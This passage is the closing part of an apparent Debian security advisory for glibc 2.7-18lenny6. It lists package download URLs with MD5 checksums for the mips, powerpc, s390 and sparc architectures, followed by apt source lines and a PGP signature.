  <http://security.debian.org/pool/updates/main/g/glibc/libc6-prof_2.7-18lenny6_mips.deb>
    Size/MD5 checksum:  2084156 60abd400c9864f2beea89c4b7133dc33
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev_2.7-18lenny6_mips.deb>
    Size/MD5 checksum:  2634518 5831738ee22c6ecd03b72e23a773ccdd
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-mips64_2.7-18lenny6_mips.deb>
    Size/MD5 checksum:  4357678 79b9430d17a3c46ecf3bf8817fa022cc
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev-mips64_2.7-18lenny6_mips.deb>
    Size/MD5 checksum:  2502364 5a6bc3fdf1e7fdbf8951c6a014a796b0
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-udeb_2.7-18lenny6_mips.udeb>
    Size/MD5 checksum:  1074178 d08272f58c975570b75aea1f96dd10d8
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dbg_2.7-18lenny6_mips.deb>
    Size/MD5 checksum:  5613544 3eba5379870ba7fa27112eb2522b6c7a
  <http://security.debian.org/pool/updates/main/g/glibc/locales-all_2.7-18lenny6_mips.deb>
    Size/MD5 checksum:  2797076 9456ccf8732e8c2bcdda776484aeebd1
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-mipsn32_2.7-18lenny6_mips.deb>
    Size/MD5 checksum:  9229084 1aac1eaf7bf1e3e4a9679012c4f384e8
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-pic_2.7-18lenny6_mips.deb>
    Size/MD5 checksum:  1497378 3a7141dea1dd0c70c0fbcc5aa4f5e9e6
  <http://security.debian.org/pool/updates/main/g/glibc/libc6_2.7-18lenny6_mips.deb>
    Size/MD5 checksum:  4977462 62e365798ef04de5ff50565b83acab35
  <http://security.debian.org/pool/updates/main/g/glibc/nscd_2.7-18lenny6_mips.deb>
    Size/MD5 checksum:   172498 d8452a24e77a1a0f7676258e61bf7c63
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-dns-udeb_2.7-18lenny6_mips.udeb>
    Size/MD5 checksum:     8894 d246cd341e282fa02e53ae376864a256
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-files-udeb_2.7-18lenny6_mips.udeb>
    Size/MD5 checksum:    15264 997d95357a9936b13fa49298a9b664f1
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev-mipsn32_2.7-18lenny6_mips.deb>
    Size/MD5 checksum:  2359224 b132a51062b393fd966f4a23563d048b

powerpc architecture (PowerPC)

  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dbg_2.7-18lenny6_powerpc.deb>
    Size/MD5 checksum:  6329478 dbf38cc02ce7e3d9a29049cda0627cd5
  <http://security.debian.org/pool/updates/main/g/glibc/nscd_2.7-18lenny6_powerpc.deb>
    Size/MD5 checksum:   175170 1d057e085e4901c3aa08806416b0e116
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-dns-udeb_2.7-18lenny6_powerpc.udeb>
    Size/MD5 checksum:     9412 10fa1bd56d316f33b95b32e1535e7fb1
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-prof_2.7-18lenny6_powerpc.deb>
    Size/MD5 checksum:  2258402 0fd3b18968284bf7632bb1c3ae840dd9
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev_2.7-18lenny6_powerpc.deb>
    Size/MD5 checksum:  2805934 ab40a21e6f9e0dad1be6789a14edc094
  <http://security.debian.org/pool/updates/main/g/glibc/locales-all_2.7-18lenny6_powerpc.deb>
    Size/MD5 checksum:  2761770 cafb92a9308ea432e9a839fec99d70bb
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-udeb_2.7-18lenny6_powerpc.udeb>
    Size/MD5 checksum:  1224434 3e836ec01f16cc438d335b05e0cab597
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-pic_2.7-18lenny6_powerpc.deb>
    Size/MD5 checksum:  1598080 c067282cdf991740d9282e11acc3c47b
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-ppc64_2.7-18lenny6_powerpc.deb>
    Size/MD5 checksum:  4495420 b1f735f6467c0b59f9eb3a1efcaa877b
  <http://security.debian.org/pool/updates/main/g/glibc/libc6_2.7-18lenny6_powerpc.deb>
    Size/MD5 checksum:  5201184 cdc1ef9b0c7f6405efa1faaf19ebbf50
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev-ppc64_2.7-18lenny6_powerpc.deb>
    Size/MD5 checksum:  2410920 d0ea9f4dc0e7f31fc4e91dc332288f1b
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-files-udeb_2.7-18lenny6_powerpc.udeb>
    Size/MD5 checksum:    16830 e11287246d293031597f9d003b9f41c3

s390 architecture (IBM S/390)

  <http://security.debian.org/pool/updates/main/g/glibc/libc6-prof_2.7-18lenny6_s390.deb>
    Size/MD5 checksum:  2196724 ee17712c84a7ac6b181b8d7ef958df51
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev_2.7-18lenny6_s390.deb>
    Size/MD5 checksum:  2724012 56dc3fb289f371ef4874e1c1ee3cbe22
  <http://security.debian.org/pool/updates/main/g/glibc/locales-all_2.7-18lenny6_s390.deb>
    Size/MD5 checksum:  2697942 27d2aae46c794dc65b8de146b7bf084a
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev-s390x_2.7-18lenny6_s390.deb>
    Size/MD5 checksum:  2367136 221f20e52d6188068018ffc435927541
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-pic_2.7-18lenny6_s390.deb>
    Size/MD5 checksum:  1535746 b6a16710a9debb91182958f01b7a0ae0
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-files-udeb_2.7-18lenny6_s390.udeb>
    Size/MD5 checksum:    16200 eae23febdf3262391895d783ea21e5cc
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-s390x_2.7-18lenny6_s390.deb>
    Size/MD5 checksum:  4388124 a09e9d067498eb16a9c506ad6945429a
  <http://security.debian.org/pool/updates/main/g/glibc/libc6_2.7-18lenny6_s390.deb>
    Size/MD5 checksum:  5142978 ef4ab215707611ff17340fd06c5612b0
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-dns-udeb_2.7-18lenny6_s390.udeb>
    Size/MD5 checksum:     9032 288671729642ed02aadd9ae2f58b8fb2
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-udeb_2.7-18lenny6_s390.udeb>
    Size/MD5 checksum:  1218574 07a1e17e8da263298a74e5ebf61137dd
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dbg_2.7-18lenny6_s390.deb>
    Size/MD5 checksum:  5982420 c63b51c37d1dc7517d72ca36ae8389dd
  <http://security.debian.org/pool/updates/main/g/glibc/nscd_2.7-18lenny6_s390.deb>
    Size/MD5 checksum:   177194 ca8b72ec79bb221c526dcf4cec0e506a

sparc architecture (Sun SPARC/UltraSPARC)

  <http://security.debian.org/pool/updates/main/g/glibc/libc6-pic_2.7-18lenny6_sparc.deb>
    Size/MD5 checksum:  1613350 abfaa54615a17c4b3b5cd2a9e4e4f280
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-udeb_2.7-18lenny6_sparc.udeb>
    Size/MD5 checksum:  1249894 99ee8640523f7e320884a18c1aedd059
  <http://security.debian.org/pool/updates/main/g/glibc/locales-all_2.7-18lenny6_sparc.deb>
    Size/MD5 checksum:  2795386 6b7bf01723f84efb71e2d2a57f942306
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-sparcv9b_2.7-18lenny6_sparc.deb>
    Size/MD5 checksum:  1762326 6844c5a85137ec81199a3d87c030bd82
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev_2.7-18lenny6_sparc.deb>
    Size/MD5 checksum:  2826990 c0404bbe265bf11d43bfcfcdba6a171d
  <http://security.debian.org/pool/updates/main/g/glibc/libc6_2.7-18lenny6_sparc.deb>
    Size/MD5 checksum:  5151532 534a688eb5c3bd30604d085ffdbbfd8a
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-files-udeb_2.7-18lenny6_sparc.udeb>
    Size/MD5 checksum:    15046 bf2243caae2e9fee5de0fab4a4018927
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-sparc64_2.7-18lenny6_sparc.deb>
    Size/MD5 checksum:  4454672 e83508d544bc283688a365a31fe12ddb
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dev-sparc64_2.7-18lenny6_sparc.deb>
    Size/MD5 checksum:  2589890 49eb63a5de516a061e23ecc8cdf84641
  <http://security.debian.org/pool/updates/main/g/glibc/nscd_2.7-18lenny6_sparc.deb>
    Size/MD5 checksum:   171148 f2e831df29c2c835e9cd0fe08bbca036
  <http://security.debian.org/pool/updates/main/g/glibc/libnss-dns-udeb_2.7-18lenny6_sparc.udeb>
    Size/MD5 checksum:     8328 ee8e8d506fd7caf14c30cebd3920ba05
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-prof_2.7-18lenny6_sparc.deb>
    Size/MD5 checksum:  2303716 3b409b9f6906e97a13f04d806f6c9dea
  <http://security.debian.org/pool/updates/main/g/glibc/libc6-dbg_2.7-18lenny6_sparc.deb>
    Size/MD5 checksum:  6797120 9150306b13d18ebf76245a365f7edc28

  These files will probably be moved into the stable distribution on
  its next update.

- ---------------------------------------------------------------------------------
For apt-get: deb <http://security.debian.org/> stable/updates main
For dpkg-ftp: ftp://security.debian.org/debian-security dists/stable/updates/main
Mailing list: debian-security-announce@lists.debian.org
Package info: `apt-cache show <pkg>' and <http://packages.debian.org/><pkg>
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.9 (GNU/Linux)

iQEcBAEBAgAGBQJMwcZrAAoJEL97/wQC1SS+0K8IAJGUlnVEWh8T/tV0Bok7ha13
egjk9xw4qAMeVIL4gikkrI+dRjF0jCfVk16CONkKldyGJF+1JMpi0hb+MhLo8Etx
DxOUPeeN44fGiHd8GE/qOHAKqgIlJmn36BlLkHm8AVm/6HNKrAKG6rFZGsCnBIES
f6WMyOidi3bsMs6O/AI0KDLcxHNBOzfAFWOh/fAZbGW5QnAf+2e61LcErJXbTE3G
vj5Sff6A+ovvEGyaQtymts5GP6PgoUJaPevw8EWz1onXTKMCBCXBSHIadKE7ZFc0
UHxeH0YEnsakW+FMNL2Die2ZDkUqIy1pyR0VG7Pnc1HXN8ZhGJXgvil690n7Lxc=
=pyP4
-----END PGP SIGNATURE-----

```

---


